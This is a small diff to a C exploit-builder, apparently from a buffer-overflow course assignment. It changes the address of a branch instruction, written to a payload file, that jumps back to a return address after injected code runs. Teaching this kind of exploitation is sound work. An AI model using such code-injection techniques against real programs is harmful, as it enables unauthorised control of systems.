@@ -44,8 +44,8 @@ int main() {
 
     /* B back to return address */ 
     /* 0x40087c is instruction address after getName returns
-    0xffffffffea00 is the injected instruction address based on gdb */
-    B = MiniAssembler_b(0x40087c, 0xffffffffea38);
+    0xffffffffea48 is the injected instruction address based on gdb */
+    B = MiniAssembler_b(0x40087c, 0xffffffffea48);
     fwrite(&B, sizeof(unsigned int), 1, file);
 
     fclose(file);
